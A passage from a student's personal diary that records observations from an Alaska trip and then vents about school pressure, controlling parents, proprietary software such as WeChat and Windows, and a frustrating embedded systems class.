focus on giving a better experience to customers\n- Tour Guides for the Alaska Railroad(mostly very young girls around 18 years old), broadcasting and making jokes or explaining history or anecdotals, entertaining tourists along the trip, demanding jobs, switch to opposite train halfway from Anchorage to Denali to go home \n- Commercial Pilots(usually mid-aged or older white male), regularly taking people for glacier landings, and icefields, also serving as guide and electricians to maintain their own planes\n- Boat Captain(usually mid-aged or older white male), driving the boat for as much as 6 hours on a single tour, also serving as a guide speaking and broadcasting about the history and the sea attractions\n- Boat Crew Members(mostly young people), working on securing the boat to shore or serving food and drinks and maintaining safety, or entertaining tourists\n- A UAF student(cross-dressing) working both as a hotel receptionist and driver to pick me up\n\nThere is noticeably a huge proportion of young, attractive women (usually around 20) working the jobs of \"welcoming guides\" or at front desks, which I reckon is intended to make things more welcoming.\n\n### Other Tour Guides\n\nThen there are the 2 ATV guides from Miami, who have been everywhere in the lower 48 states, but mainly work and entertain tourists for money.\n\nThere is also commercial Jeep tour drivers, and talks a lot about the local history and entertain tourists, anyway, to earn money. \n\n### Other Travelers\n\nThen there are those travelers.\n\n- 2 elder women who said I reminded me of their kids on the Seward Tour\n- 2 young women hiking a very difficult course in Lost Lakes in Seward, well equipped and seemed experienced\n- An Australian elderly couple, really nice, who offered me a ride in Seward, the man formerly knew how to fly planes and they owned 9 acres of land in Australia\n- 2 travers on the Alaska railroad, one saying he is going to stay in a small town for several weeks, then going to Vancouver, another saying he is spending 2 nights in Talkeetna, and stay in Alaska for 2 months\n- 2 young women sprinting down the mountains in Healy, seem experienced and athletic\n- 2 elder guys, an 80-year-old guy traveling to Denali from Anchorage, old Alaskan from 1970s, another guy with 19-year-old grandson from California\n- 2 Taiwanese couple on a train, enjoying slow-paced travel and exclaming about beautiful views, chatting with me about the trip along the way\n\nWell, some of them are affluent middle-aged or older travelers who likely accumulated wealth in their early ages somewhere else. They likely work hard or have some reliable source of income.\n\nThese people are mainly nice because they are travelers(although they might be very nice in real life too). When people are traveling they tend to be much more friendly and approachable.\n\n### Ethnicity of Alaska\n\nAlaska is predominantly white, with few blacks, Asians, or Latinos.\n\nIn Anchorage museum I remembered there seeing on TV about Black People's heritage in Alaska, so there is an effort to foster inclusivity. But minor ethnicities have less impact than California.\n\n### Computer Science Industry\n\nThere are very few tech companies or computer science jobs in Alaska. It is so hard to find a cloud VPS in Anchorage nowadays. While the West Coast has so many top tech companies, from Socal to Silicon Valley to Oregon, Seattle, and even Vancouver, Alaska just doesn't have such hype.\n\nAlaska is so remote that the whole coastline from Socal to Seattle is around the same distance as the coastline from Seattle to Anchorage, just to get a general idea. But I heard good things about Helsinki and Stockholm in tech, which are also around 60 degrees of Latitude like Anchorage.\n\nThere aren't many tech jobs in Alaska today other than writing some frontend or database for small companies. Complete remote working seems way better.\n\n### Military Culture\n\nAlthough I didn't personally experience it, there seemed to be a strong group of military people in Alaska, and a lot of local families seem to come from veterans. I don't like military.\n\n### Moving There: Realistic Perspectives\n\nWhile not impossible, I see very few possibilities of moving to Alaska in at least the next 20 years. The most we can hope for is frequent vacations or long-term stays in Alaska. Here's why.\n\n- To move to Alaska long-term, I need to get a Green Card or Immigrate to the USA, which takes years\n- To get a Green Card or Immigrate to the USA, a very realistic path is first finishing grad school, then going to work as an \"expert\" for several years in some tech company, given the current situation\n- I need to find a job to sustain myself in Alaska, and given my previous years of experience, it is likely that I have an advantage in tech\n\nMost native Alaskans I met are either blue-collar workers or workers with very special specifications, like commercial pilots.\n\nWhile not impossible, working as a \"driver\" or \"tour guide\" after decades of intensive academic training and expertise seems strange, failing to utilize my strength. These tour guides don't require much tech knowledge beyond middle school and focus more on interaction and local familiarity, either field I don't have a strength at all.\n\nEven a \"computer science teacher\" at a local high school doesn't need a PhD degree.\n\nThus getting a stable income and suitable job becomes very hard if I want to live there long-term. What's more, the cost of living is no joke. Homelessness in Alaska is better than in California, however, it is still a problem. I saw homeless camps in Cuddy Park. I saw homeless people sleeping on the ground near the train station. I saw a homeless person camping near UAA. I saw some homeless camps across the street at Rob's cottage.\n\n### What do I want(or miss)?\n\nI miss the laid-back atmosphere. Like you go there and there isn't much hurry or tension in the air, but exposed to natural beauty.\n\nWhat's more, Alaska provides a very quiet environment, away from the bustling and noisy cities. In Fairbanks, as I walked on the streets I saw there was an RV in front of almost every house. When I walk around I can find peace in my heart, and reflect quietly in my inner mind in the slow-paced lifestyle.\n\nLiving in constant pressure is no joke, it rips the fun away from me, putting me in anxiety and mental health problems. I feel a great sense of belonging there.\n\n\n\n\n## 2024.05.31\n\nThese days I came to a realization that I was fussing over too many unnecessary and useless stuff and making my life harder literally myself. Simplicity and Practicality in tech is very important. (well it isn't important if I have unlimited time, but come on, especially with the stupid demanding schoolwork)\n\nLiterally after qutting gaming everything became far more fucking exciting and there was so much to do.\n\n## What hobbies am I Dropping?\n\n- Distro Hopping(definitely, not gonna lie, just meaningless)\n- Laptop Exploration\n- Mobile Phone Exploration\n- Mobile Phone Operating System Exploration\n- Frontend Coding\n- Desktop Environment Exploring\n- IDE Exploring\n\nPeople say you can use a Thinkpad W520 from ten years ago which runs well today. People say they can upgrade the screen and the battery and the CPU. However, I am not gonna explore those old devices. This hobby is just useless and not contributing to anything practically, moreover, it's time consuming. I ust want to settle with a modern device and I mean that's it.\n\nI am not gonna try out distros like BSDs or whatever unless necessary because it's just not really useful anyways. However, there is definitely still many things to learn in `W!ndow$`, probably taking more than 30 years if I decide I gonna get used to them, and it is by far the most complicated os out there. Like literally by trying to \"hide\" complicated things through a UI makes things far more complicated than they already are. Using `W!ndow$` scares me and it always have tons of bugs. (cannot be fixed, so sad) They are also introducing something called Copilot PC with Recall feature.\n\nAs for mobile phones I just gonna settle with a modern Android one. Not gonna use some phones from 10 years ago because I just wanna save time and shut the freak up about it. I mean phones from 10 years ago definitely runs well, but it is useless. As for mobile os I just settle with Google Play anyways. I am already tired from talking about this much junk.\n\nI don't wanna do any more frontend coding unless necessary or fixing bugs(so like no coding unless fixing bugs in my own website or required). Frontend has no depth and it is endless. I am going to settle with prepared frameworks.\n\nThink about like a 2 week free time, I can either go on a vacation or I can build some frontend app. Well obviously I would be going on a vacation. But I already quit traveling, so emm. I literally haven't been going anywhere since the start of the year. So I will probably be doing Machine Learning, which sounds more practical and useful.\n\nFor like IDE or DE too, just gonna go with most popular / default.\n\n## What hobbies have already been Dropped?\n\n- Reading(quit since 2022)\n- Running(quit since 2023)\n- Music Instruments(quit since 2021)\n- Traveling(quit since 2024)\n- Chinese Ci Poetry(quit since 2021)\n\nI also quitted language learning, reading. I quit Twitter, Instagram, Telegram, Bilibili. I quit gaming, chess.\n\nAlso interesting observation, like I didn't drop these hobbies all at once, but gradually dropped them, so don't act like it's something serious because it had already happened a long time(ever after I entered that goddamn high school).\n\nI tried to experience a balanced life in my teen years but it's not like I can(or I necessarily wanted). I do want, however, to go to Alaska and work a light job(enough to sustain myself) and rot away there till death.\n\n## Did quitting hobbies make me Gloomy?\n\nI don't know, but obviously school is making me miserable in every way. I don't want to comply and hate it so much. All the complicance and fear of school backslashed on me so hard especially starting this semester I just don't find any motivation.\n\nAlso, I wasn't fine at all in freshman year(so wasn't I fine now), and people thinking I don't have a mental problem back then doesn't care about my mental health(which, I don't mind because people shouldn't care about me anyways), but the fact that people are forcing stuff on me is just downright humiliating.\n\nI was so tired and anxious and burned up and in every way in freshman year and gotten into a very bad state indeed. I was one step from breaking down all the time. I couldn't bear it anyways but this semester seem more bearable when I do more things I wanted.\n\nThis whole brainwashing in school definitely made me gloomy, but I don't know if quitting hobbies is making me glommy or not. I was having an abnormally small numbers of hobbies compared to a healthy individual, but that doesn't say anything because I also have a very very minimalistic lifestyle and I am fine with pretty much everything(or just everything) in life like what I eat and what I use and I am not picky on almost everything, clothing, climate, you name it (except wanting to live _quietly_ alone in a bedroom instead of a dorm).\n\nSo the conclusion is school makes me sad, not necessarily quitting hobbies. The real cause is being trapped in a school and having people telling me what I need to do without autonomy or freedom.\n\n## Do I actually want to Quit Hobbies\n\nYes, most of the time. Sad, but true, as I am a very minimalistic person, with or without school.\n\n\n\n## Updates 2024.5.6\n\nOh, here I am again. My parents are dictating over my life, like, seriously.\n\nI mean, I was like already 19 years old, and my parents are still trying to make me the prototype the want me to be, it is extremely annoying.\n\nMy parents are putting immense pressure on me, not only on studying, but on all aspects of my life. I need to be \"not fat\", \"sleeping regularly\", \"able to adapt to dorm life(where everybody sleeps irregularly)\", \"exercising regularly\", \"eating regularly and properly\", \"not gaming\", \"being extroverted\", \"be extremely good in tech\", \"be extremely good in school(which sucks)\", \"not exercise TOO much\". These are just some of the extremely contradictory and unhuman standards my parents enforce on me. Now, whenever I violate one of their standards, they start blabbing and bothering me, pushing on every of their measures to make me change. Also, the occasionally threatens to stop giving me money.\n\nNot just to say I am already under immense pressure and feel no urge to consent, but their standards is just impossible to achieve for me, and honestly, I am trying hard enough.\n\nWell, my last time getting back to gaming was entirely their fault, when they pushed me into doing things I didn't want to. I was depressed and there wasn't anything I could do for mental health except gaming again, which lasts 3 months time before I was coming out of the gaming again. They are causing reverse effects, not doing positive for me. The more they are pushing, the more I don't comply.\n\nMy parents don't care about my mental health and it was all of them, and they are being very inconsiderate.\n\nAs a grown adult I care for myself and I don't need anyone telling me \"I am good\", or \"I am bad\", or \"I need to change\". As long as I am not against the law and I don't bother someone else, I am good the way I am.\n\nAlso my parents are very transphobic and homophobic.(though irrelevant)\n\nThey are going to the pass the threshold, and I feel not comfortable, and they NEED to stop.\n\nWell, for one thing, I first need to go economically independent, or else I will forever be a slave. How can you argue for anything when you rely on someone's money?\n\nBut just to tell you how annoyed I feel, ahh. Like every aspect of my life is watched by someone. They should mind their own business. Are people honestly getting annoying and wanting to affect others when they reach 50 years old?\n\nI felt traumatized freshman year and my parents at that time was reluctant to let me live outside school. I had sleeping problems every night and there wasn't anything I could do except make intensify the conflict the solve the problem. I didn't talk one word all year with my roommates, and it felt extremely annoying to be living with them, ahh. I didn't have any rights. My parents are doing nothing for my wellbeing.\n\nI was being bullyed too much by autonomy and dictation, by those software companies. Being controlled feels horrifying to me. I\ndid good enough not to drop out of school, but people don't understand that.\n\nI am not a very intelligent person, and I am being overwhelmed by school work alone. They are extremely demanding jobs and requires hours of work, and they are not interesting and appealing anyways.\n\n## Updates 2024.5.5\n\nSome people are saying American is bad, and China is good. Didn't appeal to me though. American may not be very good, but I can't withstand most people's lives in China. Put me in the shoes of 90 percent Chinese and I would freak out, simple as that.\n\nIt is a miracle I live healthy till today, especially under the recent illed-guidance of my parents and some mentors.\n\n## Updates 2024.5.4\n\nWhy am I not going back to high school?\n\nI am not going back to high school because it sucks. I am not going to somewhere that sucks great shit. If I want to shit, I go behind a tree, or I go to the toilet, but I am never going back to shitty high school.\n\nHigh school is so shitty it is traumatizing to me to remember that experience.\n\nThere ain't no reason to remember high school. High school is jail--teachers are the dominant, students are the submissive. High school is where they rape you and force your consent and brainwashes you and punishes you. High school is where you get locked up 24/7.\n\nIf I felt some nostalgia and wanted to go back somewhere it would probably be SMIC school, because that was the place where at least I had fun and didn't hate. Other than that, I would suggest Shibei Middle School, although it is not an ideal place, but, more or less, not overly irritating.\n\nIn high school you cram, not study. They force you to eat down the shits of the textbook for reasons to get good in the final exam. Only this doesn't work for me anyways, so like, when I am forced to do something I don't want to do I don't do it.\n\nAlso in high school you are sleep deprived. The teachers are autonomy and your daily schedule is very very tight.\n\nHonestly I ain't contributing to the autonomy or dictatership so there I ain't going back to high school anyways. I don't like most of my high school former classmates now, and I try to maintain a reasonable distance. I mean, we can still be friends, after acknowledging the difference. Most of my high school classmates are submissive, and don't care at all about being forced to shit 24/7, there ain't no helping that bro.\n\nHigh school made me freaking hate Chinese and Chemistry and Biology, probably not again in my life would I get interested in those subjects again, shit.\n\nIf I would have a child I would hope for my child to get homeschooled or put somewhere without pressure, to be free and do whatever (they) wanted, like extensively gaming, staying up, being LGBT, whatever. It is not on me to judge someone of something they do.\n\n## Updates 2024.5.2\n\nI don't want to study freakkkk.\n\nI mean, everybody does what they are good at, and I hate studying and going to school more than ever.\n\nI don't want to study anymore but the school requires people to study lol.\n\nIf my child(suppose I have one) face the same problem I will kindly say go do whatever you want long as you have decent income.\n\nMaybe being an artist, singer, writer, etc, all more interesting than freaking school.\n\nI got obsessed with music videos these days:\\).\n\nAlso running seemed to be coming back to me. I love running.\n\nAlso, gaming is trying hard to make its comeback to my mind. I had fallend onece some day ago, and aim not to be trapped by this shit later on.\n\nGaming is the single worst thing you can ever get in life.\n\nGaming companies are BD\\dollarM companies, they trick me into being their little sub.\n\nExcept I don't want to be exploited endlessly. I don't wanna die or lose my mind. I am already more or less autistic and having multiple disorders.\n\n\n\n\n\n## Updates 2024.4.24\n\nI am probably not letting my child go to school(given that if I would have a child).\n\nThere are many big problems about school, and they are just unnegotiable. For example, some schools require their students to use WeChat. This is very problematic for my child.\n\nLet's picture this scenario. My child goes to school, and is required to use WeChat. Well, problem is, my child might not agree with WeChat's terms and conditions, so it goes against child's moral to use this software, and child believes it to be malicious. The school, obviously, didn't say that everyone must agree to WeChat's terms and conditions when they enter the school, and it is the school's fault that there might be a person who goes into the school but disagrees with using WeChat. Obviously, nor is \"everyone must use WeChat\" written in the laws, so it's not illegal for someone to refuse. Consequentially, this will be a really big problem. The fact that the terms and conditions exist is reasons not to consent to it.\n\nI am pretty much ok with web based communications like Discord, Whatsapp, but no to WeChat. I am agreeing to WeChat's terms right now because I am being coerced into agreeing by the school, or else it will cause me great discomfort. However, I don't want my child to face the same discomfort in the future.\n\nAlso, once I am not coerced into using WeChat, I will not consent to its terms and conditions(I don't even consent now lol), and I believe it is a malicious malware, and refuse to install it on my phone. But it is problematic for my child in school, though. Usually there is a parents group where everyone's parent and the teacher get together to inform some important events and stuff, and I refuse to use that app, so I won't be able to receive notifications. (If given digital freedom I will prefer a PinePhone, but that's another story. Even on Android what if I refuse to download a software?)\n\nAnyways, I am not disagreeing to too much stuff, so much that I can't live. I am still ok with web based communications because that's only like running some javascript in the browser. (I don't even care about nonfree Javascript!) I consent with using a computer, I consent with using a phone, and I consent with pretty much any FOSS softwares! I am consenting too much, not too little! If I don't consent and my child doesn't consent to WeChat, and the school assumes everyone consent to it, then there is no option but to always get into trouble in school!\n\nAnother scenario is there is a computer class, and, say, the teacher requires students to work in Windows with a proprietary software, like Keil uVision. Now, I am not saying this software is bad or something, but forcing somebody to work in Windows is against their will. Say, my child doesn't want to do that, and the child asks for alternative tools or open source platforms, or even proprietary blobs in Linux. But the teacher is so stupid and doesn't give him any instructions. Out of anger the child storms out of the classroom, and refuse to take this class.\n\nWell, the obvious consequence to such actions is the child failing this course, and, as a consequence, not being able to advance into the next grade because of \"Intellectual Disabilities\".\n\nSo if in such a scenario the child comes home and asks for my advice, I will say, the teacher is very much uneducated and technical immature--he deserver to be a delivery man more than he deserver to be a teacher(imagine a computer science teacher who doesn't know how to use cli and refuses to answer student's questions??). So obviously I will be backing child up, and child will somehow convey this message to the school classmates/teacher. As a consequence child will be isolated in school, and get really bad grades. People will likely not understand, assuming child is \"Inable in Computer Science\" or \"Just Showing Off or Acting Strange\" when child is actually not, child is only refusing to work with a proprietary software / Windows GUI and nothing else.\n\nThe child might be proficient in coding in Linux environments, and knows more about computer than the teacher do(who might be a moron in computer science).\n\nAn invalid argument is that in some cases, schools may be limited by budget constraints. However, FOSS softwares doesn't require money or budge to download! Their source code is free! Even the downloading bandwidth is free. There will only be budget constraints for the proprietary softwares! Also, there can be existing curriculums in school, but the school should always allow(or provide adequate documentation) for those seeking an alternative way.\n\nYet another scenario is the Chinese exams. The child fails in the Chinese exams(in China they are really hard), and come home crying, saying \"I\" have been criticized by the teacher. Well, what shall I do? In such a scenario I believe that the child is doing enough to take that exam in the first place, and not having a word of complaint beforehand. But those Chinese exams are boring as hell, and so is the Chinese class, and you cannot increase the scores by hard work, instead, they are usually predetermined and the teacher just don't like the answers of some students(even if they have adequate reasons to backup), and gives them low scores.\n\nOf course I don't care a damn about Chinese exams, but the school might do, and the child might be in great trouble if child keeps failing in those exams, getting far behind the average score. As a result, child might be left out among child's peer classmates, and be perceived as \"queer\".\n\nThere are more scenarios to think about. Another scenario is the child is LGBTQ+, and in some schools, girls can be objectified and perceived as partnering with a boy, contrarily, boys might be taught to marry a girl in the future. Well, what they don't realize is that there is a mass group of homosexual people, and I believe they deserve their rights! If two girls like each other, or two boys like each other, then let them be! Some teachers in teaching, might mistakenly try to create a close bond between different sex that is usually problematic.\n\nMoreover, some child might refuse to be classified, e.g. non-binary. Other might be not interested in sex at all, e.g., asexual. The school fails to represent those groups of minority.\n\nThus modern schools have too many serious problems, and poses significant challenges if my child goes into it(given that I would have a child in the first place). I would rather my child go pursue a career of athletes, like figure skating, gymnastics, distance running, etc, or, alternatively, try to be a ballet dancer, violinist, painter, philosopher, pianist, etc, than going into the traditional school.\n\nMoreover, I don't feel I have enough time to homeschool my child for around 15 years. If my wife refuse too(say, I have a wife, and we discuss about such matter), choices are to not have a child at all than assuming the child will adapt to traditional school.\n\n## Updates 2024.4.22\n\nI am in that crappy embedded system again!!! Freaking!!!\n\nAnyways, today Alipay wasn't agreeing with me. I don't want to expand. All I can say is Alipay is a very malicious app, MALICIOUS indeed! I am so tired now and a little hungry. So I downright removed Alipay from my phone LMAO.\n\nNexitally requires Alipay(?so as I thought then maybe I will be switching to another company?)\n\nAlipay's program sometimes acts like an endless loop. You go through it and it starts looping, and it never responds or return valuable information.\n\nAlipay's mini program is so buggy. It responds with a extremely high lag, and frequently errors without any clear messages. 12306 is a shitty program.\n\nAnyways, I shall stop ranting I am very very tired.\n\n## Updates 2024.4.21\n\nI didn't know I have to rant this much! Freaking! But it does seem I am a bit overwhelmed these days.\n\nSo it is official that I lost the battle against Android. I am not using a Linux phone right now, nor will I be doing that in the near future. The reasons:\n\n1. LineageOS Works Fine. Linux Mobile doesn't(bad browser experience and having so many problems)\n2. LineageOS is degoogled(except for GBoard)\n3. I am losing too much time flashing devices.\n4. I rely on Android anyways(WeChat)\n\nToday WeChat recommended a prostitution ad to me, so Fu\\*k You WeChat,\n\nSo yeah, the basic conclusion is Linux mobile is worse in terms of usability and convenience than LineageOS(the citical factor is calling, lol), and I am against using Proprietary operating systems for like calling stuff only(Even if it's simple). LineageOS is open source and pretty customizable, it just lacks a traditonal cli like Linux.\n\nI am very sad indeed and looked at phones 10 years ago, which gave me lots of nostalgia. I remembered clearly those times where I used cash to do stuff and they gave me much more control. I didn't have a smartphone until 2020 and I didn't use it extensively until late 2022. I couldn't but feel a deep sense of remorse and just literally helplessness right now.\n\nWeChat is more or less a malware stuff, and I hate it so much. I refuse to go on 3rd party apps. I try to refuse as much as I can. I lost this fight, there is nothing I can do about it, and that is the end of stuff.\n\nI started to listen to sad love songs, not for a girl in my mind, but for nostalgic feeling.\n\n## Updates 2024.4.16\n\nThe political teacher is very annoying, and the politics class is very annoying.\n\nIt is not annoying in the traditional way, like politics course in middle school where they try to stuck those ideas into your mind. Instead, the teacher is frequently touching sensitive topics, and \"suggesting stuff\", it's very annoying.\n\nI don't dare to talk one thing bad about Winnie in China because otherwise I would be jailed for life and tortured to death. I try to be as apolitical as possible to maintain a neutral stance. If you don't do anything chances are you won't be arrested in China.\n\nAnyways, especially those senseless talks in the group, and the teacher frequently touching those topics annoyed me. Someone said WeChat facced sanctions, and suggested opening a Telegram Group for \"chatting in freedom\", and wanted to talk about the tanks in Beijing. I almost bursted out \"if you want to open a gropu why not open a matrix or Libera Chat instead of like Telegram\", but controlled myself not to talk anything in the politics class group.\n\nWell, people are talking about politics when they rely on proprietary software, lmao. They can't life the sanctions off their head and they are talking about politics? Hilarious! Imagine, losers.\n\nAnyways, politics is just annoying, everything about it is very bothering to me, and I really hate it or discussing it. I consider myself more aligned with libertarianism(but not 100 percent libertarian, more like non-party). I also consider myself a open source software advocate(not Free software, though, I rely too much on some non-Free softwares, FSF is too incompatible with modern living standards).\n\nComputer science stuff simply appeal to me more than fu\\*king gaming or Winnie, and I can't care less about politics, lol. I hate this fu\\*king politics class more than a boring politics class.\n\n## Updates 2024.4.15\n\nWell today I am going to that class again, and holy crap! I installed stm32cube on my laptop, but I could not figure out how to use it. Anyways, they packed those .bat files and everything generated, I am speaking, literally, in the folder.\n\nThere was no way for me to figure things out except use crappy Windows, and I don't understand why I would be punished this harshly just attending a shitty general class. I mean, like using Windows feels like torture.\n\nI kind of wished I had selected any course other than this because this is just a piece of shit everything here.\n\nIf I hadn't attended Embedded system course in Berkeley, I would be very annoyed at embedded systems. Although I didn't get a good grade back there, at least it made me very very interested in everything embeded related, including Linux phones and stuff and all of those, Arduino, etc. But the hostility of this course and the systems and the software, ahh, everything, made me wanna throw up.\n\nAlright, the kind kind teacher came and try to install it for me, but he failed miserably, after messing around with Windows crappy shitty GUi\uff0ctrying to navigate his way through the messay GUI, couldn't figure it out as well, and try to generate a keys(a software needs keys to use?shouldn't it be released open sourced?)\n\nAnyways, a student came by and stated he could do it in vscode for me, and he tried and bundled with it a bit, and it needs a exe path. Of course it is by no means available on my own computer, (the freaking keil extension isn't available in the first place anyways in OSS Code), so like after that he said he needed to go and left without a fix for the problem.\n\nSo I was stuck with broken IDEs. I tried to ask for him to do it in cli but he said he hadn't known cli before, so I am greatly puzzled and distressed. Then like he left without a clear message, and the windows desktop shortcuts no longer opens lmfao.\n\nWell before I only heard windows is bad for setting up environment and many people recommend it in Debian based distros, but this is the first time someone tells me I could only do something in Windows, and refuses to use cli. He said he doesn't know how, and I strongly question his skills and ability. I said I use Linux, he was like \"what is Linux? I don't know Linux\", which is almost like for a baby \"I don't know how to walk please tell me\".\n\nAnyways after that the teacher came and reattempted to install the software for me, only failing miserably again, and he was digging through the messy stupid gui. I went online to that website and attempted to download an exe(exes splash files all over the place it messes up the whole computer), but I couldn't find anything valuable through the messy frontends.\n\nI kept saying I like cli and offered the stmcube IDE. However, the teacher said he didn't know and haven't used that tool lmfao. He didn't know how to use cli either.\n\nWindows is just a bloated mess when it comes to softwares, and when it is actually installing stuff it gets really stinky, and it just DONT work, period.\n\nThe website has a http (very insecure, fraudulent suspected!), and there is no way to access it. There are several 1000 pages info pdfs(expect me to read wtf?).\n\nAnyways, the teacher went off to another group to check them off, then he went back and continued attempting to install it for me. I mumbled thanks now and then, and the teacher said he would send me the key to me in QQ. Ahh, I am so amazed by such a patient person! If it was me I would give up the installation process in half a minute!\n\nThen the teacher send the code to me in QQ! I am honestly after all this crap I am no longer even angry lmao. And he made it work! After 1 hour of hard work finished installing!\n\n## Updates 2024.4.8\n\nSo something extremely annoying happened in the embeded system class.\n\nActually this class isn't even a major class, it's for general public. I had already taken grad Embeded systems in Berkeley.\n\nIn the class I had no idea what to do and I had no idea how to do it. I am just struck with loads of confusion and frustration, adding to this painful day.\n\nSo what happened was that the teacher made us do some `experiments` with a board, and I had no idea what the fu\\*k to do. No one else had a problem! Only me! I am serious!\n\nThe teacher asked students to download something called `keil \u00b5Vision`. It is start of a nightmare to work with this shitty thing. It doesn't even support Linux, and I was like what? Well it is my first time I actually had a problem with a software not supported in Linux though.\n\nAnyways, I was like, well, this gotta be hard. Truth is, the software so called `keil \u00b5Vision` is both proprietary and has a very very complicated ui that I have no idea what to do with it. There are windows computers in the lab but using them is just very very painful, and agasint my morals. I would refuse and fight against the piece of rot.\n\nWell, what struck me is how much trouble I would encounter with so called \"general education\" computer science course.\n\nI like to control things with cli, problem is, working in windows literally made me disgusted.\n\nVirtual machines are also painful and bloat, especially running a crapware like shitty Windows, which occupies hundreds of Gigabytes for no purpose at all. I mean, running a Linux VM is good enough, but windows, well, that's another story altogether.\n\nI tried to ask the teacher, turns out teacher doesn't know, or isn't familiar with Linux.(Teacher isn't familiar with Google Lmao) It is like my first time facing an actual incompatibility problem in Linux. Anyways, I quickly decided not to use the shitty vision IDE.\n\nWell I scanned the QR code on the back of the dev board, and it opened up a website with all resources in BaiduNetDisk. Turns out baidu is in my blacklisted websites, so lol.\n\nAlso BaiduNetDisk requires downloading its rotten malware app to be able to download just anything to my device, and it completely disrespects and bullies its users. Baidu is a company that's autonomous and tries every means to dominate its users, just like in those typical bd\\dollarm movies where man dominates and objectify a woman, except the user takes the role of woman here.\n\nFor a moment I got really thankful I went to Berkeley for a year. I never thought like that before. In my year in Berkeley I was miserable, struggling mentally and academically. Now looking back, I found the year valuable in many ways, at least it is much more meaningful than wasting time here in China. Honestly I never learned one thing about computer science in USTC, I mean not one thing at all. All I learned here previously (before I visited Berkeley) is computer science is a terrible thing, and I better stay away from it.\n\nStallman expressed: \"All things learned in Education shall be free softwares!\" Well you know what? Here is a class where I am required to use nonfree softwares(and use Windows! I am scared).\n\nI started to really missing the `Lingua Franca` program I used in Berkeley for Pololu. I started missing my Raspberry Pi. I got no idea why people would design shit like this for me. I know I had done many evils, like eating animals or whatever, but why do I have to bear with shit softwares? I am better off dead.\n\nThen I finally downloaded the example code after like unzipping a million layers. Even the folder is a complete mess--they zip it multiple layers, you know? I was like What the Freak? They zipped it and included those generated files, and included a million projects with generated files for each in one folder, and it isn't even available anywhere in GitHub or something. Honestly it look every bit like piece of malware or softwares like primary school students would be digusted to write.\n\nThe files are mostly generated by the crappy \"keil vision\" software. It is like, well, imagine uploading all the node modules everywhere you go, or a HuggingFace Model with Pytorch environment packed with every python script. And it is not a personal project, which can be forgiven for ignorance or lack of time to organize. Come on, it's a commercial product.\n\nThere is also a website `https://prechin.net/` written on the back of it. Turns out this website is dangerous and I need to click through the dangers to proceed. It's no difference than a scam website that says your computer is infected with virus and asks for bitcoins. The frontend looks like a piece of crap to me. Why don't they just run a discourse if they don't want to manually code everything?\n\nAny software that works exclusively on Windows is pure garbage. I am liberal enough and I am not against proprietary softwares, but being both proprietary and working solely on a os that dominates its users, man!\n\nThere are certain softwares that work only on Windows, turns out they can't work.\n\nWell, what can I say about them? They have every last bit of bad practices in everything, code, website. Ahh, I would trust a homeless person more than the shitty company, and the shitty class.\n\nThose people even included \"open source\" in their website title. So Shameless!\n\nAnyways, after finally extracting the files I try to write a makefile to make it work. But it kept failing, constantly complaining about the file (a library). Obviously the teacher doesn't know how to debug. He doesn't know how to use Linux lmao.\n\nSo that was the end of class, and I got kind of scared.\n\n\n### Thinking about Freedom\n\n**Tags**: `freedom`\n\nToday I was thinking about what I wanted to do in my life in the future, and I thought about like PhD degree and being a professor or whatever, but more like, I don't have any potentials to think about my future life right now.\n\nI am not free. I am constantly controlled and manipulated by my parents, and I am in the giant pool of anxiety and depression and inconfidence. I was in that condition as long as I left middle school, not that middle school is good or whatever. I clearly remembered happy for a bright future when I was walking around in Green City after 9th grade. But everything was but my hope(not things are bad or whatever, they are just, unreasonable). Ever since I entered high school, I felt into the swarm of depression and anxiety, and I couldn't get out.\n\nI think that I must first strive for 4 freedoms before thinking about a clear goal in my life(because all I can think about is these 4 freedoms right now).\n\nThe first freedom is freedom of time. This literally means I must have a substantial amount of time for myself. This doesn't mean I won't be studying for that long, instead, it means I get the freedom to decide whether I want to study or not for a substantial amount of time. I get to decide whether to study or play or sleep or stay up all night, given that I don't distract others. That is not ideal for now, but quite close.\n\nThe second freedomm is freedom of choice. I get to decide things, and I get to keep my preferences. If I prefer sommething, people don't \"friendly advise\" me to do otherwise. This friendly advise is usually strong coersion. If I don't like something, fine, long as it doesn't affect others, I get to keep it as I want. If I have a strange hobby that many people find unreasonable, fine! Actually I don't care about the choice for foods or room that much, but I don't care doesn't mean I don't have the right to care. If I want to watch porn, fine!(not that I want to watch porn) If I want to play video games for 24 hours straight and given I can care for my health, fine! If I dislike living in a dorm, and I don't distract others when living alone, then I don't live in a dorm, and no questions asked. I have the freedom to choose! This is not ideal for now, primarily because my parents keeps \"friendly coercing\" me to do contradictory things all the time, constantly mocking and threatening even, making me very tense. I don't dislike my parents, they are good guys. But they need to stop impacting my choices, and they are becoming annoying now at this.\n\nThe third freedom is digital freedom. This includes using open-source softwares. I don't support Richard Stallman's views 100%, especially his free softwares. I find open-source softwares good enough, and I think more importantly I need to have control over the software. WeChat, in particular, is a malware, and crawls slowly into the user's mind and dominates the user. It is not only a malware in the phone, but also a malware in the user's brain. WeChat makes users depend on it, depriving them of control, and constantly brainwashes its users, just like many other Chinese platforms. When I start using WeChat I would spend a far substantial time online doing all sorts of completely meaningless activities. The easiest way to achieve digital freedom is to use PostMarketOS for smartphone, and lock LineageOS Redmi Phone is a box, and only open it seldomly for doing necessary stuff. This is not ideal, but pretty close too.\n\nThe fourth freedom is self-sufficiency. I need to support myself without depending on my parent's money. This is important because if I depend on them, then I need to listen to their advices. They have the power over me. The problem is my parents are getting increasingly misleading, and gives contrary and wrong ideas in many aspects of my life, and they want to control my life in their hands. Well, if I go self sufficient I will have a much stronger voice when not listening. I am already an adult, if I commit a crime I need to take full respoonsibility of it, so why shouldn't I take full responsibility of other aspects of my life? Also, if I don't want to live in a dorm and my parents does, and I go self-sufficient, then I can go live in wherever I can afford, and I can give no specific reasons for my behaviors. This is far from being satisfied since I have no income now. I need to have a stable income, and constantly support myself, not that my family is poor, but just to illlustrate that I can.\n\nSo I hope for these to be true in the PostGrad period. If I got ththoseose things satisfied, then I can try thinking about my life's goals or aims. Without these, all that's in my head is the enormous endless depression and anxiety when I think about such things.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Updates March\n\n### Freedom -- the the Starting Point in Life's Meanings\n\nThere are many times when I started thinking about what to do, and it ultimately boils down to what is life's true purposes. And it took me many days trying to figure it out, and I am still failing.\n\nBut the starting point is freedom, in self-control. Freedom in 3 ways- physical and digital freedom, time freedom, and freedom of choice.\n\nWithout freedom there is no talking about whatever meanings of life is. I am not willing to sacrifice freedom for any achievements(partially like a few weeks, yes, in long terms, no).\n\nMany ambitious goals **ROB** me of freedom, and that's what got me undetermined.\n\nWithout freedom 